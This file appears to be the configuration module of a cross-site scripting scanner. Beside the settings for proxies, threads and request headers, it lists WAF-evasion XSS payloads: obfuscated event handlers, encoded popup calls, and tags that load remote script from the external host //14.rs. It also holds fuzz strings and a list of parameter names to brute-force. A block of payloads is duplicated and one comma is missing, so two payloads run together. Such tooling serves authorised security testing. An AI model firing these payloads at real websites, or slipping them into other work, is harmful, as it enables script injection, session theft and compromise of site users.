from typing import Dict, List, Tuple, Any

changes: str = '''Negligible DOM XSS false positives;x10 faster crawling'''
globalVariables: Dict[str, Any] = {}  # it holds variables during runtime for collaboration across modules

defaultEditor: str = 'nano'
blindPayload: str = ''  # your blind XSS payload
xsschecker: str = 'v3dm0s'  # A non malicious string to check for reflections and stuff

#  More information on adding proxies: http://docs.python-requests.org/en/master/user/advanced/#proxies
proxies: Dict[str, str] = {'http': 'http://0.0.0.0:8080', 'https': 'http://0.0.0.0:8080'}

minEfficiency: int = 90  # payloads below this efficiency will not be displayed

delay: int = 0  # default delay between http requests
threadCount: int = 10  # default number of threads
timeout: int = 10  # default number of http request timeout

# attributes that have special properties
specialAttributes: List[str] = ['srcdoc', 'src']

badTags: Tuple[str, ...] = ('iframe', 'title', 'textarea', 'noembed',
           'style', 'template', 'noscript')

tags: Tuple[str, ...] = ('html', 'd3v', 'a', 'details')  # HTML Tags

# "Things" that can be used between js functions and breakers e.g. '};alert()//
jFillings: Tuple[str, ...] = (';')
# "Things" that can be used before > e.g. <tag attr=value%0dx>
lFillings: Tuple[str, ...] = ('', '%0dx')
# "Things" to use between event handler and = or between function and =
eFillings: Tuple[str, ...] = ('%09', '%0a', '%0d',  '+')
fillings: Tuple[str, ...] = ('%09', '%0a', '%0d', '/+/')  # "Things" to use instead of space

eventHandlers: Dict[str, List[str]] = {  # Event handlers and the tags compatible with them
    'ontoggle': ['details'],
    'onpointerenter': ['d3v', 'details', 'html', 'a'],
    'onmouseover': ['a', 'html', 'd3v']
}

functions: Tuple[str, ...] = (  # JavaScript functions to get a popup
    '[8].find(confirm)', 'confirm()',
    '(confirm)()', 'co\u006efir\u006d()',
    '(prompt)``', 'a=prompt,a()')

payloads: Tuple[str, ...] = (  # Payloads for filter & WAF evasion
    '\'"</Script><Html Onmouseover=(confirm)()//'
    '<imG/sRc=l oNerrOr=(prompt)() x>',
    '<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>',
    '<deTails open oNToggle=confi\u0072m()>',
    '<img sRc=l oNerrOr=(confirm)() x>',
    '<svg/x=">"/onload=confirm()//',
    '<svg%0Aonload=%09((pro\u006dpt))()//',
    '<iMg sRc=x:confirm`` oNlOad=e\u0076al(src)>',
    '<sCript x>confirm``</scRipt x>',
    '<Script x>prompt()</scRiPt x>',
    '<sCriPt sRc=//14.rs>',
    '<embed//sRc=//14.rs>',
    '<base href=//14.rs/><script src=/>',
    '<object//data=//14.rs>',
    '<s=" onclick=confirm``>clickme',
    '<svG oNLoad=co\u006efirm&#x28;1&#x29>',
    '\'"</Script><Html Onmouseover=(confirm)()//'
    '<imG/sRc=l oNerrOr=(prompt)() x>',
    '<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>',
    '<deTails open oNToggle=confi\u0072m()>',
    '<img sRc=l oNerrOr=(confirm)() x>',
    '<svg/x=">"/onload=confirm()//',
    '<svg%0Aonload=%09((pro\u006dpt))()//',
    '<iMg sRc=x:confirm`` oNlOad=e\u0076al(src)>',
    '<sCript x>confirm``</scRipt x>',
    '<Script x>prompt()</scRiPt x>',
    '<sCriPt sRc=//14.rs>',
    '<embed//sRc=//14.rs>',
    '<base href=//14.rs/><script src=/>',
    '<object//data=//14.rs>',
    '<s=" onclick=confirm``>clickme',
    '<svG oNLoad=co\u006efirm&#x28;1&#x29>',
    '\'"><y///oNMousEDown=((confirm))()>Click',
    '<a/href=javascript&colon;co\u006efirm&#40;&quot;1&quot;&#41;>clickme</a>',
    '<img src=x onerror=confir\u006d`1`>',
    '<svg/onload=co\u006efir\u006d`1`>')

fuzzes = (  # Fuzz strings to test WAFs
    '<test', '<test//', '<test>', '<test x>', '<test x=y', '<test x=y//',
    '<test/oNxX=yYy//', '<test oNxX=yYy>', '<test onload=x', '<test/o%00nload=x',
    '<test sRc=xxx', '<test data=asa', '<test data=javascript:asa', '<svg x=y>',
    '<details x=y//', '<a href=x//', '<emBed x=y>', '<object x=y//', '<bGsOund sRc=x>',
    '<iSinDEx x=y//', '<aUdio x=y>', '<script x=y>', '<script//src=//', '">payload<br/attr="',
    '"-confirm``-"', '<test ONdBlcLicK=x>', '<test/oNcoNTeXtMenU=x>', '<test OndRAgOvEr=x>')

headers = {  # default headers
    'User-Agent': '$',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip,deflate',
    'Connection': 'close',
    'DNT': '1',
    'Upgrade-Insecure-Requests': '1',
}

blindParams = [  # common paramtere names to be bruteforced for parameter discovery
    'redirect', 'redir', 'url', 'link', 'goto', 'debug', '_debug', 'test', 'get', 'index', 'src', 'source', 'file',
    'frame', 'config', 'new', 'old', 'var', 'rurl', 'return_to', '_return', 'returl', 'last', 'text', 'load', 'email',
    'mail', 'user', 'username', 'password', 'pass', 'passwd', 'first_name', 'last_name', 'back', 'href', 'ref', 'data', 'input',
    'out', 'net', 'host', 'address', 'code', 'auth', 'userid', 'auth_token', 'token', 'error', 'keyword', 'key', 'q', 'query', 'aid',
    'bid', 'cid', 'did', 'eid', 'fid', 'gid', 'hid', 'iid', 'jid', 'kid', 'lid', 'mid', 'nid', 'oid', 'pid', 'qid', 'rid', 'sid',
    'tid', 'uid', 'vid', 'wid', 'xid', 'yid', 'zid', 'cal', 'country', 'x', 'y', 'topic', 'title', 'head', 'higher', 'lower', 'width',
    'height', 'add', 'result', 'log', 'demo', 'example', 'message']
